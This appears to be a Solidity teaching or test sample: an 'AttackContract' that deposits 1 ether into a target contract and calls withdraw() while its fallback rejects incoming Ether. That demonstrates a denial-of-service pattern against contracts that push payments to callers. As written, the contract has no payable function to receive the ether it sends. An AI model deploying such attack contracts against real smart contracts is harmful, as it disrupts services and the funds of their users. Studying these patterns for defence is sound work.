// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;

contract AttackContract {
    // Non-payable fallback function to reject Ether
    fallback() external {
        revert("This contract does not accept Ether");
    }

    function attack(address vulnerableContract) public {
        // Deposit Ether into the vulnerable contract
        (bool success, ) = vulnerableContract.call{value: 1 ether}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "Deposit failed");

        // Attempt to withdraw Ether from the vulnerable contract
        (success, ) = vulnerableContract.call(
            abi.encodeWithSignature("withdraw()")
        );
        require(success, "Withdraw failed"); // This will fail if the transfer from withdraw fails
    }
}
